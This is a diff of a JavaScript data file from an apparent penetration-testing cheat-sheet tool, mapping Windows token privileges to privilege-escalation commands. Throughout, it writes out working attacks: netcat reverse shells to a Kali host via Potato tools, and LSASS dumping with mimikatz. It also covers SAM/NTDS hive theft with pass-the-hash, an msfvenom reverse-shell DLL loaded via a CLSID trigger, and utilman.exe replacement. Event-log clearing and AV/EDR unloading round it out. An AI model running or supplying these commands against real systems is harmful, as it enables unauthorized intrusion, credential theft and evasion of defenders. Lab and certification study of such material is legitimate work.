@@ -7197,132 +7197,182 @@ const LIN_VULNS = [
 //  TOKEN PRIVILEGE EXPLOIT MAP  (from token.html arsenal)
 // ═══════════════════════════════════════════════════════════════
 const PRIV_EXPLOITS = {
+  // disabledOk:true  = exploit tool self-enables via AdjustTokenPrivileges() — run directly
+  // disabledOk:false = needs explicit enable first via EnableAllTokenPrivs.ps1
+  // enableHint       = specific per-privilege advice when found disabled
   'SeImpersonatePrivilege': {
     sev:'c', section:'win-potatoes',
-    summary:'Potato family → SYSTEM. Most common path on IIS/MSSQL.',
+    disabledOk: false,
+    enableHint: 'If from LOCAL/NETWORK SERVICE shell — run FullPowers.exe first (restores stripped token). Otherwise run EnableAllTokenPrivs.ps1 then re-check.',
+    summary:'Potato family → SYSTEM. Most common path on IIS/MSSQL service accounts.',
     tools:[
-      {name:'GodPotato-NET4.exe', note:'Best — works Server 2012–2022 + Win10/11', cmd:'{{WPATH}}\\GodPotato-NET4.exe -cmd "cmd /c whoami"', link:'https://github.com/BeichenDream/GodPotato'},
-      {name:'PrintSpoofer64.exe', note:'Win10/Srv2016/2019 — requires Spooler running', cmd:'{{WPATH}}\\PrintSpoofer64.exe -i -c cmd', link:'https://github.com/itm4n/PrintSpoofer'},
-      {name:'JuicyPotatoNG.exe', note:'Server 2019+ fallback', cmd:'{{WPATH}}\\JuicyPotatoNG.exe -t * -p "C:\\Windows\\System32\\cmd.exe" -a "/c whoami"', link:'https://github.com/antonioCoco/JuicyPotatoNG'},
-      {name:'SigmaPotato.exe', note:'No Spooler needed — build ≥ 18362', cmd:'{{WPATH}}\\SigmaPotato.exe "cmd /c whoami"', link:'https://github.com/tylerdotrar/SigmaPotato'},
-      {name:'SweetPotato.exe', note:'Combined JuicyPotato+PrintSpoofer — good fallback', cmd:'{{WPATH}}\\SweetPotato.exe -e EfsRpc -p "cmd.exe" -a "/c whoami"', link:'https://github.com/CCob/SweetPotato'},
+      {name:'GodPotato-NET4.exe', note:'Best — works Server 2012–2022 + Win10/11', cmd:'{{WPATH}}\\GodPotato-NET4.exe -cmd "cmd /c {{WPATH}}\\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"', link:'https://github.com/BeichenDream/GodPotato'},
+      {name:'PrintSpoofer64.exe', note:'Win10/Srv2016/2019 — requires Spooler running', cmd:'{{WPATH}}\\PrintSpoofer64.exe -c "{{WPATH}}\\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"', link:'https://github.com/itm4n/PrintSpoofer'},
+      {name:'JuicyPotatoNG.exe', note:'Server 2019+ fallback', cmd:'{{WPATH}}\\JuicyPotatoNG.exe -t * -p "C:\\Windows\\System32\\cmd.exe" -a "/c {{WPATH}}\\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"', link:'https://github.com/antonioCoco/JuicyPotatoNG'},
+      {name:'SigmaPotato.exe', note:'No Spooler needed — build ≥ 18362', cmd:'{{WPATH}}\\SigmaPotato.exe "{{WPATH}}\\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"', link:'https://github.com/tylerdotrar/SigmaPotato'},
+      {name:'SweetPotato.exe', note:'Combined JuicyPotato+PrintSpoofer — good fallback', cmd:'{{WPATH}}\\SweetPotato.exe -e EfsRpc -p {{WPATH}}\\nc64.exe -a "{{KALI_IP}} {{RPORT}} -e cmd"', link:'https://github.com/CCob/SweetPotato'},
     ],
-    warning:'If shell was spawned by a service account (LOCAL SERVICE / NETWORK SERVICE) → run FullPowers.exe FIRST to restore stripped tokens before any potato.',
+    warning:'If shell was spawned by LOCAL/NETWORK SERVICE → run FullPowers.exe FIRST to restore stripped tokens before any potato. If only SeAssignPrimaryToken (not SeImpersonate) → use -t u flag with JuicyPotatoNG.',
     detect:'whoami /priv | findstr SeImpersonate'
   },
   'SeAssignPrimaryTokenPrivilege': {
     sev:'c', section:'win-potatoes',
-    summary:'Same as SeImpersonate — full potato family applies.',
+    disabledOk: false,
+    enableHint: 'Run FullPowers.exe (recovers both SeImpersonate + SeAssignPrimary) or EnableAllTokenPrivs.ps1.',
+    summary:'Same potato family as SeImpersonate — uses CreateProcessAsUser instead of CreateProcessWithTokenW.',
     tools:[
-      {name:'GodPotato-NET4.exe', note:'Universal — works all builds', cmd:'{{WPATH}}\\GodPotato-NET4.exe -cmd "cmd /c whoami"', link:'https://github.com/BeichenDream/GodPotato'},
-      {name:'JuicyPotatoNG.exe', note:'Server 2019+', cmd:'{{WPATH}}\\JuicyPotatoNG.exe -t * -p "cmd.exe"', link:'https://github.com/antonioCoco/JuicyPotatoNG'},
+      {name:'GodPotato-NET4.exe', note:'Universal — works all builds', cmd:'{{WPATH}}\\GodPotato-NET4.exe -cmd "cmd /c {{WPATH}}\\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"', link:'https://github.com/BeichenDream/GodPotato'},
+      {name:'JuicyPotatoNG.exe -t u', note:'SeAssignPrimary ONLY mode (no SeImpersonate)', cmd:'{{WPATH}}\\JuicyPotatoNG.exe -t u -p "C:\\Windows\\System32\\cmd.exe" -a "/c {{WPATH}}\\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"', link:'https://github.com/antonioCoco/JuicyPotatoNG'},
     ],
-    warning:'Often present alongside SeImpersonatePrivilege. One or both → potato works.',
+    warning:'Often present alongside SeImpersonatePrivilege. One or both → potato works. If ONLY SeAssignPrimary (not SeImpersonate) use -t u flag.',
     detect:'whoami /priv | findstr SeAssignPrimaryToken'
   },
   'SeDebugPrivilege': {
     sev:'c', section:'win-exploits',
-    summary:'Read/write any process memory → LSASS dump → steal credentials or SYSTEM token.',
+    disabledOk: true,
+    enableHint: 'mimikatz runs "privilege::debug" automatically to self-enable. For other tools, use EnableAllTokenPrivs.ps1 first.',
+    summary:'Read/write any process memory → LSASS dump → steal creds or steal SYSTEM token from winlogon.',
     tools:[
-      {name:'mimikatz.exe', note:'Dump LSASS in-memory — most complete', cmd:'{{WPATH}}\\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit', link:'https://github.com/gentilkiwi/mimikatz'},
-      {name:'procdump.exe', note:'Safe LSASS dump — bring to Kali for offline parsing', cmd:'{{WPATH}}\\procdump.exe -ma lsass.exe lsass.dmp', link:'https://docs.microsoft.com/sysinternals/downloads/procdump'},
-      {name:'rundll32 comsvcs.dll', note:'No extra tool — built-in', cmd:'powershell -c "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id {{WPATH}}\\lsass.dmp full"', link:''},
-      {name:'Kali: mimikatz offline', note:'After transferring lsass.dmp to Kali', cmd:'mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit', link:''},
+      {name:'mimikatz.exe', note:'Self-enables via privilege::debug — most complete', cmd:'{{WPATH}}\\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit', link:'https://github.com/gentilkiwi/mimikatz'},
+      {name:'procdump64.exe', note:'Safe Sysinternals LSASS dump — accepts eula + self-enables', cmd:'{{WPATH}}\\procdump64.exe -accepteula -ma lsass.exe {{WPATH}}\\lsass.dmp', link:'https://docs.microsoft.com/sysinternals/downloads/procdump'},
+      {name:'rundll32 comsvcs.dll', note:'Pure LOLBAS — no binary upload', cmd:'powershell -c "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id {{WPATH}}\\lsass.dmp full"', link:''},
+      {name:'psgetsys.ps1 (token steal)', note:'Steal SYSTEM token from winlogon.exe → SYSTEM shell', cmd:'Import-Module {{WPATH}}\\psgetsys.ps1; ImpersonateFromParentPid -ppid (Get-Process winlogon).Id -command "C:\\Windows\\System32\\cmd.exe" -cmdargs "/c {{WPATH}}\\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"', link:'https://github.com/decoder-it/psgetsystem'},
+      {name:'Kali: parse offline dump', note:'After exfilling lsass.dmp', cmd:'pypykatz lsa minidump lsass.dmp', link:''},
     ],
-    warning:'Dumping LSASS triggers Defender and most AV. Use comsvcs.dll method or procdump -r flag for evasion.',
+    warning:'LSASS dump triggers Defender + most AV. Use comsvcs.dll method or procdump -r for evasion. Run from elevated SeDebug context (check: whoami /priv shows Enabled after self-enable).',
     detect:'whoami /priv | findstr SeDebug'
   },
   'SeBackupPrivilege': {
     sev:'h', section:'win-exploits',
-    summary:'Bypass file ACLs — read any file including NTDS.dit → all domain hashes.',
+    disabledOk: false,
+    enableHint: 'robocopy /b uses backup semantics natively (works even disabled). For diskshadow/Copy-FileSeBackupPrivilege chain → run EnableAllTokenPrivs.ps1 first.',
+    summary:'Bypass file read ACLs → read NTDS.dit or SAM/SYSTEM hives → dump all hashes. Enabled OR disabled = exploitable via robocopy /b.',
     tools:[
-      {name:'diskshadow.exe (built-in)', note:'Create VSS shadow copy to access NTDS.dit', cmd:'diskshadow /s pwn.dsh', link:''},
-      {name:'SeBackupPrivilegeUtils.dll', note:'Copy NTDS.dit via backup semantics', cmd:'Copy-FileSeBackupPrivilege Z:\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit', link:'https://github.com/giuliano108/SeBackupPrivilege'},
-      {name:'robocopy /b', note:'Built-in backup-mode file copy', cmd:'robocopy /b C:\\Windows\\System32\\config C:\\Temp SAM SYSTEM SECURITY', link:''},
-      {name:'Kali: secretsdump', note:'After transferring hive/ntds files', cmd:'impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL', link:''},
+      {name:'robocopy /b (built-in)', note:'WORKS EVEN DISABLED — uses backup flag intrinsically', cmd:'robocopy /b C:\\Windows\\System32\\config C:\\Temp SAM SYSTEM SECURITY', link:''},
+      {name:'reg save (built-in)', note:'Direct registry hive dump', cmd:'reg save HKLM\\SAM C:\\Temp\\sam.hiv & reg save HKLM\\SYSTEM C:\\Temp\\sys.hiv & reg save HKLM\\SECURITY C:\\Temp\\sec.hiv', link:''},
+      {name:'diskshadow + DLLs', note:'For NTDS.dit (domain controller)', cmd:'diskshadow /s C:\\Temp\\pwn.dsh', link:'https://github.com/giuliano108/SeBackupPrivilege'},
+      {name:'Kali: secretsdump (SAM)', note:'After exfil — local box hashes', cmd:'impacket-secretsdump -sam sam.hiv -system sys.hiv -security sec.hiv LOCAL', link:''},
+      {name:'Kali: secretsdump (NTDS)', note:'After exfil — all domain hashes', cmd:'impacket-secretsdump -ntds ntds.dit -system sys.hiv LOCAL', link:''},
+      {name:'Kali: PTH after dump', note:'Pass-the-Hash with Administrator NTLM', cmd:'impacket-psexec -hashes ":NTLMHASH" Administrator@{{TARGET}}', link:''},
     ],
-    steps:['echo "set context persistent nowriters" > pwn.dsh && echo "add volume c: alias pwn" >> pwn.dsh && echo "create" >> pwn.dsh && echo "expose %pwn% z:" >> pwn.dsh',
-           'diskshadow.exe /s pwn.dsh',
-           'Import-Module .\\SeBackupPrivilegeCmdLets.dll; Import-Module .\\SeBackupPrivilegeUtils.dll',
-           'Copy-FileSeBackupPrivilege z:\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit',
-           'reg save HKLM\\SYSTEM C:\\Temp\\system',
-           'impacket-secretsdump -ntds ntds.dit -system system LOCAL  # on Kali'],
-    warning:'Evil-WinRM strips SeBackupPrivilege. Use native PSRemoting session instead.',
+    steps:[
+      '# FAST: robocopy /b (no tools needed — works even when Disabled)',
+      'robocopy /b C:\\Windows\\System32\\config C:\\Temp SAM SYSTEM SECURITY',
+      '# OR: reg save approach',
+      'reg save HKLM\\SAM C:\\Temp\\sam.hiv & reg save HKLM\\SYSTEM C:\\Temp\\sys.hiv',
+      '# Kali: exfil → dump hashes',
+      'impacket-secretsdump -sam sam.hiv -system sys.hiv -security sec.hiv LOCAL',
+      '# DC: NTDS.dit via diskshadow',
+      '[System.IO.File]::WriteAllText("C:\\Temp\\pwn.dsh","set context persistent nowriters`r`nadd volume c: alias pwn`r`ncreate`r`nexpose %pwn% z:`r`n")',
+      'diskshadow /s C:\\Temp\\pwn.dsh',
+      'Import-Module .\\SeBackupPrivilegeCmdLets.dll; Import-Module .\\SeBackupPrivilegeUtils.dll',
+      'Copy-FileSeBackupPrivilege z:\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit',
+      'impacket-secretsdump -ntds ntds.dit -system sys.hiv LOCAL'],
+    warning:'Evil-WinRM strips SeBackupPrivilege. Use native PSRemoting (New-PSSession) or winrs -r:{{TARGET}} instead. For Hokkaido (PG): reg save is the clean path.',
     detect:'whoami /priv | findstr SeBackup'
   },
   'SeRestorePrivilege': {
     sev:'h', section:'win-exploits',
-    summary:'Write any file bypassing ACLs → replace system binary → SYSTEM.',
+    disabledOk: false,
+    enableHint: 'Enable via EnableAllTokenPrivs.ps1. SeRestoreAbuse.exe does NOT self-enable — priv must be active before running the tool.',
+    summary:'Bypass file write ACLs → overwrite any system binary → SYSTEM. Often combined with SeBackup (Backup Operators group).',
     tools:[
-      {name:'SeRestoreAbuse.exe', note:'Cleanest — no binary swap needed', cmd:'{{WPATH}}\\SeRestoreAbuse.exe "{{WPATH}}\\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"', link:'https://github.com/xct/SeRestoreAbuse'},
-      {name:'Manual utilman swap', note:'RDP must be open (port 3389)', cmd:'ren C:\\Windows\\System32\\utilman.exe utilman.old && copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe', link:''},
-      {name:'Reg key hijack', note:'Modify ImagePath of a service via registry backup semantics', cmd:'reg save HKLM\\SYSTEM\\CurrentControlSet\\Services\\VulnSvc C:\\Temp\\svc.hiv', link:''},
+      {name:'SeRestoreAbuse.exe', note:'Cleanest — arbitrary command as SYSTEM', cmd:'{{WPATH}}\\SeRestoreAbuse.exe "{{WPATH}}\\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"', link:'https://github.com/xct/SeRestoreAbuse'},
+      {name:'utilman.exe swap (RDP needed)', note:'Lock screen → Win+U → SYSTEM cmd', cmd:'takeown /f C:\\Windows\\System32\\utilman.exe & icacls C:\\Windows\\System32\\utilman.exe /grant "%USERNAME%":F & copy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe', link:''},
+      {name:'Service binary replace', note:'Replace a stopped service binary', cmd:'{{WPATH}}\\SeRestoreAbuse.exe "cmd /c copy {{WPATH}}\\shell.exe \\"C:\\Program Files\\VulnService\\svc.exe\\""', link:''},
     ],
-    warning:'Requires RDP for utilman swap. SeRestoreAbuse.exe is the cleanest option.',
+    warning:'Requires EnableAllTokenPrivs.ps1 first. Requires RDP for utilman swap. SeRestoreAbuse.exe is cleanest — wraps all needed API calls.',
     detect:'whoami /priv | findstr SeRestore'
   },
   'SeTakeOwnershipPrivilege': {
     sev:'h', section:'win-exploits',
-    summary:'Take ownership of any file/object → grant yourself write → replace binary.',
+    disabledOk: false,
+    enableHint: 'Run EnableAllTokenPrivs.ps1 first — takeown.exe does NOT call AdjustTokenPrivileges() automatically.',
+    summary:'Take ownership of any file/registry key/service → grant yourself full control → replace binary or read protected file.',
     tools:[
-      {name:'takeown + icacls (built-in)', note:'No extra tools needed', cmd:'takeown /f C:\\Windows\\System32\\utilman.exe && icacls C:\\Windows\\System32\\utilman.exe /grant "%USERNAME%":F', link:''},
-      {name:'PowerShell SetOwner', note:'More reliable on modern builds', cmd:'$acl=Get-Acl C:\\Windows\\System32\\utilman.exe; $acl.SetOwner([System.Security.Principal.NTAccount]"$env:USERNAME"); Set-Acl C:\\Windows\\System32\\utilman.exe $acl', link:''},
+      {name:'takeown + icacls (built-in)', note:'File-level ownership — no tools', cmd:'takeown /f C:\\Windows\\System32\\utilman.exe & icacls C:\\Windows\\System32\\utilman.exe /grant "%USERNAME%":F & copy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe', link:''},
+      {name:'takeown /f directory', note:'Broad approach — own entire System32', cmd:'takeown /f "%windir%\\system32" & icacls "%windir%\\system32" /grant "%username%":F', link:''},
+      {name:'PowerShell SetOwner', note:'More reliable — works on files AND registry', cmd:'$acl=Get-Acl C:\\Windows\\System32\\utilman.exe; $acl.SetOwner([System.Security.Principal.NTAccount]"$env:USERNAME"); Set-Acl C:\\Windows\\System32\\utilman.exe $acl', link:''},
+      {name:'SAM registry takeover', note:'Own HKLM\\SAM → read local hashes', cmd:'$acl=Get-Acl "HKLM:\\SAM\\SAM\\Domains\\Account"; $rule=New-Object System.Security.AccessControl.RegistryAccessRule("$env:USERNAME","FullControl","Allow"); $acl.AddAccessRule($rule); Set-Acl "HKLM:\\SAM\\SAM\\Domains\\Account" $acl; reg save HKLM\\SAM C:\\Temp\\sam.hiv', link:''},
     ],
-    warning:'Back up utilman.exe before replacing! Save as utilman.bak.',
+    steps:[
+      'copy C:\\Windows\\System32\\utilman.exe C:\\Temp\\utilman.exe.bak  # BACKUP FIRST',
+      'takeown /f C:\\Windows\\System32\\utilman.exe',
+      'icacls C:\\Windows\\System32\\utilman.exe /grant "%USERNAME%":F',
+      'copy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe',
+      '# RDP: lock screen → Win+U → SYSTEM cmd.exe pops'],
+    warning:'ALWAYS backup utilman.exe first. RDP required for Win+U trick. Alternatively own a SYSTEM service binary and restart it.',
     detect:'whoami /priv | findstr SeTakeOwnership'
   },
   'SeManageVolumePrivilege': {
     sev:'c', section:'win-exploits',
-    summary:'Grant Everyone:FullControl on C:\\ → drop DLL in System32 subdir → trigger SYSTEM DLL load. Used on PG Practice "Access" box.',
+    disabledOk: true,
+    enableHint: 'SeManageVolumeExploit.exe calls AdjustTokenPrivileges() internally — run the exploit DIRECTLY even when Disabled. No pre-enabling needed. Real-world: PG Practice "Access" box — priv was Disabled and exploit still worked.',
+    summary:'FSCTL_SD_GLOBAL_CHANGE grants Everyone:FullControl on C:\\ → drop malicious DLL in spool path → PrintNotify CLSID triggers SYSTEM DLL load. PG Practice "Access" box. Works even when DISABLED.',
     tools:[
-      {name:'SeManageVolumeExploit.exe', note:'Grants C:\\ full permissions instantly', cmd:'{{WPATH}}\\SeManageVolumeExploit.exe', link:'https://github.com/CsEnox/SeManageVolumeExploit'},
+      {name:'SeManageVolumeExploit.exe', note:'Self-enables + grants C:\\ full perms instantly', cmd:'{{WPATH}}\\SeManageVolumeExploit.exe', link:'https://github.com/CsEnox/SeManageVolumeExploit'},
       {name:'msfvenom (Kali)', note:'Generate malicious PrintConfig.dll', cmd:'msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o PrintConfig.dll', link:''},
-      {name:'PrintNotify CLSID trigger', note:'Trigger after placing DLL at spool\\drivers\\x64\\3\\', cmd:'$type=[Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}"); [Activator]::CreateInstance($type)', link:''},
-      {name:'systeminfo trigger', note:'Place tzres.dll at System32\\wbem\\ instead', cmd:'iwr http://{{KALI_IP}}:{{PORT}}/tzres.dll -OutFile "C:\\Windows\\System32\\wbem\\tzres.dll"; systeminfo', link:''},
+      {name:'iwr upload DLL', note:'Place at exact DLL path', cmd:'iwr http://{{KALI_IP}}:{{PORT}}/PrintConfig.dll -OutFile "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\PrintConfig.dll"', link:''},
+      {name:'PrintNotify CLSID trigger', note:'Trigger after DLL placed — spawns SYSTEM process', cmd:'$type=[Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}"); [Activator]::CreateInstance($type)', link:''},
+      {name:'tzres.dll alt trigger', note:'Alternative — place tzres.dll → run systeminfo', cmd:'iwr http://{{KALI_IP}}:{{PORT}}/tzres.dll -OutFile "C:\\Windows\\System32\\wbem\\tzres.dll"; systeminfo', link:''},
     ],
     steps:[
-      '1. {{WPATH}}\\SeManageVolumeExploit.exe   # grants C:\\ full perms',
-      '2. [Kali] msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o PrintConfig.dll',
-      '3. iwr http://{{KALI_IP}}:{{PORT}}/PrintConfig.dll -OutFile "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\PrintConfig.dll"',
-      '4. [Kali] nc -lvnp {{RPORT}}',
-      '5. $type=[Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}"); [Activator]::CreateInstance($type)',
-    ],
-    warning:'svc_mssql accounts commonly hold this. DLL path must be exactly: C:\\Windows\\System32\\spool\\drivers\\x64\\3\\PrintConfig.dll',
+      '# Kali: generate payload DLL',
+      'msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o PrintConfig.dll',
+      '# Target: run exploit (self-enables even if Disabled)',
+      '{{WPATH}}\\SeManageVolumeExploit.exe',
+      '# Target: upload DLL to exact path',
+      'iwr http://{{KALI_IP}}:{{PORT}}/PrintConfig.dll -OutFile "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\PrintConfig.dll"',
+      '# Kali: start listener',
+      'nc -lvnp {{RPORT}}',
+      '# Target: trigger PrintNotify CLSID',
+      '$type=[Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}"); [Activator]::CreateInstance($type)',
+      '# ALT trigger: iwr http://{{KALI_IP}}:{{PORT}}/tzres.dll -OutFile "C:\\Windows\\System32\\wbem\\tzres.dll"; systeminfo'],
+    warning:'DLL path must be exactly: C:\\Windows\\System32\\spool\\drivers\\x64\\3\\PrintConfig.dll — even one character off fails. svc_mssql and similar service accounts commonly hold this. Exploit works even when priv shows as DISABLED.',
     detect:'whoami /priv | findstr SeManageVolume'
   },
   'SeLoadDriverPrivilege': {
     sev:'h', section:'win-exploits',
-    summary:'Load kernel driver without admin → load vulnerable signed driver → kernel exploit → SYSTEM.',
+    disabledOk: false,
+    enableHint: 'Run EnableAllTokenPrivs.ps1 first — eoploaddriver_x64.exe needs the priv enabled before calling NtLoadDriver.',
+    summary:'Load kernel driver without admin → load vulnerable signed driver (Capcom/szkg64) → kernel exploit → SYSTEM.',
     tools:[
-      {name:'eoploaddriver_x64.exe', note:'Load driver via registry without admin (k4sth4 precompiled)', cmd:'{{WPATH}}\\eoploaddriver_x64.exe System\\CurrentControlSet\\dfserv {{WPATH}}\\Capcom.sys', link:'https://github.com/k4sth4/SeLoadDriverPrivilege'},
-      {name:'ExploitCapcom.exe', note:'Exploit loaded Capcom driver → SYSTEM (k4sth4 fork, EXPLOIT syntax)', cmd:'{{WPATH}}\\ExploitCapcom.exe EXPLOIT "{{WPATH}}\\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"', link:'https://github.com/k4sth4/SeLoadDriverPrivilege'},
-      {name:'fltMC unload', note:'Side effect: unload security/AV drivers', cmd:'fltMC unload sysmondrv', link:''},
+      {name:'eoploaddriver_x64.exe', note:'Load driver via HKCU registry — no admin needed', cmd:'{{WPATH}}\\eoploaddriver_x64.exe System\\CurrentControlSet\\dfserv {{WPATH}}\\Capcom.sys', link:'https://github.com/k4sth4/SeLoadDriverPrivilege'},
+      {name:'ExploitCapcom.exe', note:'Exploit loaded Capcom driver → SYSTEM', cmd:'{{WPATH}}\\ExploitCapcom.exe EXPLOIT "{{WPATH}}\\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"', link:'https://github.com/k4sth4/SeLoadDriverPrivilege'},
+      {name:'fltMC unload', note:'Side effect: blind AV/EDR by unloading its filter driver', cmd:'fltMC unload sysmondrv', link:''},
     ],
-    warning:'Print Operators group also gets SeLoadDriverPrivilege. Clean up: reg delete HKLM\\System\\CurrentControlSet\\dfserv /f',
+    warning:'Capcom.sys is on Windows blocklist on patched systems — use szkg64.sys (CVE-2018-15732) on modern targets. Print Operators group inherits this priv. Clean up: reg delete HKCU\\System\\CurrentControlSet\\dfserv /f',
     detect:'whoami /priv | findstr SeLoadDriver'
   },
   'SeTcbPrivilege': {
     sev:'h', section:'win-exploits',
-    summary:'Act as part of OS → create arbitrary SYSTEM-level token via LsaLogonUser → SYSTEM.',
+    disabledOk: false,
+    enableHint: 'Run EnableAllTokenPrivs.ps1 first. SeTcb is almost never held by non-SYSTEM — if present it is gold.',
+    summary:'Act as part of OS → LsaLogonUser S4U with SYSTEM SID → forge SYSTEM token → SYSTEM shell. ExploitDB Paper #42556.',
     tools:[
-      {name:'TcbElevation.exe', note:'Spawns SYSTEM process via SeTcb', cmd:'{{WPATH}}\\TcbElevation.exe pwn "C:\\Windows\\System32\\cmd.exe /c {{WPATH}}\\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"', link:'https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178'},
+      {name:'TcbElevation.exe', note:'Spawns SYSTEM process via SeTcb LsaLogonUser', cmd:'{{WPATH}}\\TcbElevation.exe pwn "C:\\Windows\\System32\\cmd.exe /c {{WPATH}}\\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"', link:'https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178'},
+      {name:'PrivFu TokenMagician', note:'Full token manipulation toolkit', cmd:'{{WPATH}}\\TokenMagician.exe', link:'https://github.com/daem0nc0re/PrivFu'},
     ],
-    warning:'Very rarely delegated. If present alongside other privs, exploit SeTcb first for cleanest path.',
+    warning:'Very rarely delegated outside SYSTEM/TCB accounts. ExploitDB paper #42556 is the definitive resource.',
     detect:'whoami /priv | findstr SeTcb'
   },
   'SeCreateTokenPrivilege': {
     sev:'h', section:'win-exploits',
-    summary:'Forge arbitrary access token with any group memberships (including local admin) → escalate.',
+    disabledOk: false,
+    enableHint: 'Enable via EnableAllTokenPrivs.ps1. CRITICAL: SeCreateToken ALONE cannot escalate — also needs SeImpersonate or SeAssignPrimary.',
+    summary:'Forge arbitrary access token with any SIDs/groups (including local admin) via NtCreateToken → impersonate → SYSTEM.',
     tools:[
-      {name:'token-priv suite', note:'hatRiot PoC — NtCreateToken with admin group', cmd:'{{WPATH}}\\SeCreateTokenPrivilege.exe', link:'https://github.com/hatRiot/token-priv'},
-      {name:'PrivFu suite', note:'Full privilege manipulation', cmd:'{{WPATH}}\\TokenMagician.exe', link:'https://github.com/daem0nc0re/PrivFu'},
+      {name:'token-priv suite', note:'hatRiot PoC — NtCreateToken with admin SID', cmd:'{{WPATH}}\\SeCreateTokenPrivilege.exe', link:'https://github.com/hatRiot/token-priv'},
+      {name:'PrivFu suite', note:'Full privilege manipulation framework', cmd:'{{WPATH}}\\TokenMagician.exe', link:'https://github.com/daem0nc0re/PrivFu'},
     ],
-    warning:'Extremely rare in the wild. Usually only held by SYSTEM itself.',
+    warning:'CRITICAL: Requires companion privilege — SeImpersonatePrivilege OR SeAssignPrimaryTokenPrivilege. Without one of these, the forged token cannot be used. Extremely rare in the wild.',
     detect:'whoami /priv | findstr SeCreateToken'
   },
   'SeSecurityPrivilege': {
     sev:'m', section:'win-exploits',
-    summary:'Manage/read security event log → clear tracks or read audit data.',
+    disabledOk: false,
+    enableHint: 'Run EnableAllTokenPrivs.ps1. SeSecurityPrivilege is primarily for log manipulation — useful for opsec not direct escalation.',
+    summary:'Manage/read Security event log → clear audit trail, read credential-related events, or manipulate auditing.',
     tools:[
       {name:'wevtutil (built-in)', note:'Clear Security + System logs', cmd:'wevtutil cl Security && wevtutil cl System && wevtutil cl Application', link:''},
       {name:'wevtutil query', note:'Read Security events — find logon activity, creds', cmd:'wevtutil qe Security /c:50 /rd:true /f:text | findstr /i "pass\\|user\\|logon"', link:''},
@@ -7331,16 +7381,21 @@ const PRIV_EXPLOITS = {
   },
   'SeShutdownPrivilege': {
     sev:'l', section:'win-exploits',
-    summary:'Force reboot → trigger service restarts, planted payloads, or race conditions.',
+    disabledOk: true,
+    enableHint: 'shutdown.exe enables the priv internally. Works even when shown as Disabled.',
+    summary:'Force reboot → trigger service restarts, planted payloads, or race conditions on restart.',
     tools:[
-      {name:'shutdown (built-in)', note:'Immediate reboot', cmd:'shutdown /r /t 0', link:''},
+      {name:'shutdown (built-in)', note:'Immediate reboot — works even Disabled', cmd:'shutdown /r /t 0', link:''},
+      {name:'shutdown remote', note:'Reboot a remote host you have creds for', cmd:'shutdown /s /f /m \\\\{{TARGET}} /t 0', link:''},
     ],
-    warning:'Use with DLL hijack or service payload that needs restart to trigger.',
+    warning:'Use with DLL hijack or service payload that needs restart to trigger. Remote reboot: SeRemoteShutdownPrivilege also needed.',
     detect:'whoami /priv | findstr SeShutdown'
   },
   'SeCreateSymbolicLinkPrivilege': {
     sev:'m', section:'win-dll',
-    summary:'Create symlinks to privileged paths → redirect service file writes → arbitrary write as SYSTEM.',
+    disabledOk: false,
+    enableHint: 'Run EnableAllTokenPrivs.ps1 first — mklink requires the priv to be enabled.',
+    summary:'Create symlinks to privileged paths → redirect service file writes to attacker-controlled location → arbitrary write-as-SYSTEM.',
     tools:[
       {name:'mklink (built-in)', note:'Symlink from writable dir → privileged path', cmd:'cmd /c mklink C:\\Temp\\target.dll C:\\Windows\\System32\\target.dll', link:''},
       {name:'PowerShell New-Item', note:'More reliable PS version', cmd:'New-Item -ItemType SymbolicLink -Path C:\\Temp\\link -Target C:\\Windows\\System32\\vuln.dll', link:''},
@@ -7349,30 +7404,33 @@ const PRIV_EXPLOITS = {
   },
   'SeRelabelPrivilege': {
     sev:'m', section:'win-exploits',
-    summary:'Change integrity levels on objects → elevate a process or file to High/System integrity → bypass mandatory integrity control.',
+    disabledOk: false,
+    enableHint: 'Only useful if your current IL is already High or System. Run: whoami /groups | findstr "Integrity Level" to verify before trying to enable.',
+    summary:'Change integrity labels on objects → elevate process to High/System integrity → bypass MIC. Only effective from High IL token.',
     tools:[
